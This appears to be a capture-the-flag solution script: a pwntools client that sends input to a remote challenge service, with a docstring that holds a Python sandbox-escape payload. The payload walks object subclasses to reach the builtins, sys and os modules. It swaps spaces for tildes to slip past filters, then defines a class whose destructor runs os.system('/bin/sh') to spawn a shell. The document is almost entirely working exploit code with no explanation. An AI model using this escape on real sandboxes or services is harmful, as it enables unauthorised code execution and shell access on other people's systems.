from pwn import *

line1 = raw_input().strip()
line2 = raw_input().strip()

proc = remote("pwnable.org", 41337)
proc.recvuntil(">>> ")
proc.sendline(line1)
proc.recvuntil(">>> ")
proc.sendline(line2)

proc.shutdown()

print(proc.recvall())


"""
[].__class__.__base__.__subclasses__()[-9]()._module.sys.modules['builtins'].exec("[].__class__.__base__.__subclasses__()[-9]()._module.sys.modules['poopoo69']={'sys':[].__class__.__base__.__subclasses__()[-9]()._module.sys.modules['sys'],'os':[].__class__.__base__.__subclasses__()[-9]()._module.sys.modules['os'],'__builtins__':[].__class__.__base__.__subclasses__()[-9]()._module.sys.modules['builtins']}".replace('~',"\x20"))

[].__class__.__base__.__subclasses__()[-9]()._module.sys.modules['builtins'].exec('class~A:\n~~~~def~__init__(self):\n~~~~~~~~self.m~=~sys\n~~~~def~__del__(self):\n~~~~~~~~os.system("/bin/sh")\nx=A()'.replace('~',"\x20"),[].__class__.__base__.__subclasses__()[-9]()._module.sys.modules['poopoo69'])
"""
